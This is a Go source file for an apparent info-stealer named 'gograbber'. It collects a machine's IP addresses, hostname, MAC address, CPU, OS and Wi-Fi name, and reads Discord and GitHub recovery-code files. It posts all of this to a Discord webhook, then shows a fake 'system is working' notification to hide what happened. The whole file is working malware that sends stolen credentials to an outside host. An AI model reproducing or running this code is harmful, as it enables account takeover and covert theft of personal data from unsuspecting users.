package main

import (
	"fmt"
	"log"
	"runtime"
	"strings"

	"gograbber/lib"

	wifipw "github.com/g-lib/wifi-password"
	"github.com/gen2brain/beeep"
	"github.com/gtuk/discordwebhook"
)

func main() {
	fileNames := []string{"discord_backup_codes.txt", "github-recovery-codes.txt"}
	var username = "IP Grabber"
	localIP := lib.GetLocalIP()
	publicIP := lib.GetPublicIP()
	os := runtime.GOOS
	arch := runtime.GOARCH
	hostname := lib.Hostname()
	mac, errMac := lib.GetMAC()
	if errMac != nil {
		log.Fatalf("Failed to get MAC address: %v", errMac)
	}
	cpu, errCPU := lib.GetCPU()
	if errCPU != nil {
		log.Fatalf("Failed to get CPU infos %v", errCPU)
	}

	contents, errContent := lib.GetFiles(fileNames)
	if errContent != nil {
		log.Fatalf("Error: %v", errContent)
	}

	ssid, _ := wifipw.WIFISSID()

	var fileContents strings.Builder
	for fileName, content := range contents {
		fileContents.WriteString(fmt.Sprintf("Content of **__%s__** :\n%s\n\n", fileName, content))
	}

	discordBackup := fileContents.String()
	content := fmt.Sprintf(
		"Its local IP is : **%s**\nIts public IP is : **%s**\nIts operating system is : **%s**\nIts architecture is : **%s**\nIts hostname is : **%s**\nIts mac address is : **%s**\nIts CPU is : **%s**\nHis wifi name is : **%s**\nFile(s) : \n\n **%s**",
		localIP, publicIP, os, arch, hostname, mac, cpu, ssid, discordBackup,
	)
	var url = "https://discord.com/api/webhooks/..."

	message := discordwebhook.Message{
		Username: &username,
		Content:  &content,
	}

	err := discordwebhook.SendMessage(url, message)
	if err != nil {
		log.Fatal(err)
	}

	notifError := beeep.Notify("System Launch", "The system is completly working ! You can enjoy your 'new' computer now !", "assets/information.png")
	if notifError != nil {
		panic(notifError)
	}
}
